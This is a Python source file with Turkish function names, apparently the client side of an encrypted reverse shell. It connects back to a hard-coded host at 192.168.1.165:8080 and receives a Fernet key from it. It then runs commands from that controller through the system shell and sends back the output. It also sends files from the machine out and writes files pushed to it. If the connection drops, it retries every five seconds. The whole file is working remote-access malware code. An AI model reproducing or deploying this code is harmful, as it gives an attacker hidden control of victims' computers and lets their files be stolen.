import subprocess
import socket
from cryptography.fernet import Fernet
import time
import os
def geri():
    try:
        os.chdir("..")
        return os.getcwd().encode("utf-8")
    except Exception as e:
        return str(e).encode("utf-8")
def komut_calistir(cmd):
    try:
        
        cikti = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        return cikti
    except Exception as e:
      
        return str(e).encode("utf-8")
def ileri(cmd):
    try:
        dosya=cmd[3:].strip()
        os.chdir(dosya)
        yol=os.getcwd()
        return yol.encode("utf-8")  
    except Exception as e:
        return str(e).encode("utf-8")
def dosya_gonder(cmd, server, fer):
    try:
        dosya_yolu = cmd[9:].strip()
        with open(dosya_yolu, "rb") as f:
            data = f.read()
        
   
        sifreli_veri = fer.encrypt(data)
        toplam_boyut = len(sifreli_veri)
        

        header = str(toplam_boyut).zfill(10).encode("utf-8")
        
        server.sendall(header)        
        server.sendall(sifreli_veri)  
        
    except Exception as e:
        print(f"Dosya gönderilemedi: {e}")
        try:
            server.sendall(b"ERROR     ") 
        except:
            pass
    

def dosya_al(client, fer, cmd):
    try:
        
        yol = cmd[7:].strip()
        filename = yol.replace("\\", "/").split("/")[-1]
        if not filename: filename = "yuklenen_dosya"

      
        raw_header = client.recv(10).decode("utf-8").strip()
        if not raw_header: return b"Hata: Baglanti koptu"
        
        if raw_header == "ERROR":
            return "Hata: Sunucu dosyayı bulamadı veya gönderemedi.".encode("utf-8")
            
        total_size = int(raw_header)
        
    
        encrypted_data = b""
        while len(encrypted_data) < total_size:
            chunk = client.recv(min(4096, total_size - len(encrypted_data)))
            if not chunk: break
            encrypted_data += chunk
            
       
        decrypted_data = fer.decrypt(encrypted_data)
        with open(filename, "wb") as f:
            f.write(decrypted_data)
            
        return f"[+] Dosya başarıyla yüklendi: {filename}".encode("utf-8")
    except Exception as e:
        return f"[!] Dosya alma hatası: {str(e)}".encode("utf-8")

def main():
    while True: 
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect(("192.168.1.165", 8080))
            
          
            key = client.recv(4096).decode()
            fer = Fernet(key)
            
            while True: 
            
                raw_cmd = client.recv(16896)
                if not raw_cmd: break #
                
         
                cmd = fer.decrypt(raw_cmd).decode("utf-8")
                
                if cmd.lower() == "exit":
                    break
                if cmd=="cd ..":
                    client.sendall(fer.encrypt(geri()))
                elif cmd.startswith("download "):
                    dosya_gonder(cmd,client,fer)
                elif cmd.startswith("upload "):
                    sonuc = dosya_al(client, fer, cmd)
                    client.sendall(fer.encrypt(sonuc))
                elif cmd.startswith("cd "):
                    client.sendall(fer.encrypt(ileri(cmd)))
                else:
                    sonuc = komut_calistir(cmd)
                    client.sendall(fer.encrypt(sonuc))
                
        except Exception:
            
            time.sleep(5)
            continue

if __name__ == "__main__":
    main()